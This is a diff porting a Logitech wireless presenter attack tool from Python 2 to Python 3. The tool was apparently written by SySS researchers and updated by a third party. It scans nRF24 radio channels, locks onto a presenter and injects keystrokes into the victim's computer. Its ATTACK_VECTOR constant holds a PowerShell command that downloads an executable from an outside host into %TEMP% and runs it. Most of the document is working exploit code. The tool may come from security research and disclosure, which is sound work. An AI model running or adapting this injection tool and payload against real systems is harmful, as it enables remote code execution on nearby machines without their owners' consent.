@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -23,24 +23,34 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+     
+  Einstein2150 (Update 2024):
+  This program has been migrated and further developed for use with
+  Python 3 by Einstein2150. The author acknowledges that ongoing
+  enhancements and updates to the codebase may continue in the future.
+  Users should be aware that the use of this program is at their own
+  risk, and the author accepts no responsibility for any damages that
+  may arise from its use. It is the user's responsibility to ensure 
+  that their use of the program complies with all applicable laws 
+  and regulations.
+  
 """
 
-__version__ = '1.0'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '1.1'
+__author__ = 'Einstein2150'
 
 import argparse
 import sys
-
 from binascii import hexlify, unhexlify
 from lib import nrf24, keyboard
 from time import sleep, time
 
-DWELL_TIME      = 0.1                       # dwell time for each channel in seconds
-KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds
-ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+DWELL_TIME = 0.1  # dwell time for each channel in seconds
+KEYSTROKE_DELAY = 0.01  # keystroke delay in seconds
+ATTACK_VECTOR = "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
 
 # Logitech Unifying Keep Alive packet with 80 ms
-# SET_KEEP_ALIVE = unhexlify("004F000370000000003E")
 KEEP_ALIVE_80 = unhexlify("004003704D")
 KEEP_ALIVE_TIMEOUT = 0.06
 
@@ -48,15 +58,18 @@ KEEP_ALIVE_TIMEOUT = 0.06
 def banner():
     """Show a fancy banner"""
 
-    print("        _____  ______ ___  _  _     _____  _                      _  \n"
-"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
-"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
-" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
-" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
-" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
-"                                                    __/ |             \n"
-"                                                   |___/              \n"
-"Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))
+    print((
+        "        _____  ______ ___  _  _     _____  _                      _  \n"
+        "       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
+        "  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
+        " | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
+        " | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
+        " |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
+        "                                                    __/ |             \n"
+        "                                                   |___/              \n"
+        "Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016\n"
+        "optimized for use with Python 3 by Einstein2150 (2024)\n".format(__version__)
+    ))
 
 
 # main program
@@ -67,7 +80,7 @@ if __name__ == '__main__':
     # init argument parser
     parser = argparse.ArgumentParser()
     parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
-    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
+    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=list(range(2, 84)), metavar='N')
 
     # parse arguments
     args = parser.parse_args()
@@ -78,16 +91,15 @@ if __name__ == '__main__':
     if args.address:
         try:
             # address of nRF24 presenter (CAUTION: Reversed byte order compared to sniffer tools!)
-            # TODO: Check address length. Must be 5 bytes.
-            address = args.address.replace(':', '').decode('hex')[::-1][:5]
-            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address)
-        except:
-            print("[-] Error: Invalid address")
-            exit(1)
+            address = bytes.fromhex(args.address.replace(':', ''))[::-1][:5]
+            address_string = ':'.join('{:02X}'.format(b) for b in address)
+        except Exception as e:
+            print("[-] Error: Invalid address", e)
+            sys.exit(1)
     else:
-        address = ""
+        address = b""
 
-     # initialize keyboard for Logitech Presenter (for example Logitech R400)
+    # initialize keyboard for Logitech Presenter (for example Logitech R400)
     kbd = keyboard.LogitechPresenter()
 
     # initialize radio
@@ -116,9 +128,10 @@ if __name__ == '__main__':
         # init variables with default values from nrf24-sniffer.py
         timeout = 0.1
         ping_payload = unhexlify('0F0F0F0F')
-        ack_timeout = 250 # range: 250-40000, steps: 250
+        ack_timeout = 250  # range: 250-40000, steps: 250
         ack_timeout = int(ack_timeout / 250) - 1
-        retries = 1 # range: 0-15
+        retries = 1  # range: 0-15
+
         while True:
             # follow the target device if it changes channels
             if time() - last_ping > timeout:
@@ -131,16 +144,16 @@ if __name__ == '__main__':
                         if radio.transmit_payload(ping_payload, ack_timeout, retries):
                             # ping successful, exit out of the ping sweep
                             last_ping = time()
-                            print("[*] Ping success on channel {0}".format(scan_channels[channel_index]))
+                            print("[*] Ping success on channel {}".format(scan_channels[channel_index]))
                             success = True
                             break
                     # ping sweep failed
                     if not success:
-                        print("[*] Unable to ping {0}".format(address_string))
+                        print("[*] Unable to ping {}".format(address_string))
                 # ping succeeded on the active channel
                 else:
-                  print("[*] Ping success on channel {0}".format(scan_channels[channel_index]))
-                  last_ping = time()
+                    print("[*] Ping success on channel {}".format(scan_channels[channel_index]))
+                    last_ping = time()
 
             # receive payloads
             value = radio.receive_payload()
@@ -150,7 +163,7 @@ if __name__ == '__main__':
                 # split the payload from the status byte
                 payload = value[1:]
                 if len(payload) >= 5:
-                    break;
+                    break
     else:
         # sweep through the channels and decode ESB packets in pseudo-promiscuous mode
         print("[*] Scanning for Logitech wireless presenter ...")
@@ -158,7 +171,7 @@ if __name__ == '__main__':
         while True:
             # increment the channel
             if len(scan_channels) > 1 and time() - last_tune > DWELL_TIME:
-                channel_index = (channel_index + 1) % (len(scan_channels))
+                channel_index = (channel_index + 1) % len(scan_channels)
                 radio.set_channel(scan_channels[channel_index])
                 last_tune = time()
 
@@ -169,13 +182,13 @@ if __name__ == '__main__':
                 address, payload = value[0:5], value[5:]
 
                 # convert address to string and reverse byte order
-                converted_address = address[::-1].tostring()
+                converted_address = address[::-1]
                 address_string = ':'.join('{:02X}'.format(b) for b in address)
-                print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, scan_channels[channel_index]))
+                print("[+] Found nRF24 device with address {} on channel {}".format(address_string, scan_channels[channel_index]))
 
                 # ask user about device
-                answer = raw_input("[?] Attack this device (y/n)? ")
-                if answer[0] == 'y':
+                answer = input("[?] Attack this device (y/n)? ")
+                if answer[0].lower() == 'y':
                     # put the radio in sniffer mode (ESB w/o auto ACKs)
                     radio.enter_sniffer_mode(converted_address)
                     break
@@ -187,7 +200,7 @@ if __name__ == '__main__':
         try:
             radio.transmit_payload(KEEP_ALIVE_80)
             sleep(KEEP_ALIVE_TIMEOUT)
-        except:
+        except KeyboardInterrupt:
             break
 
     print("\n[*] Start keystroke injection ...")
@@ -218,4 +231,3 @@ if __name__ == '__main__':
         sleep(KEYSTROKE_DELAY)
 
     print("[*] Done.")
-
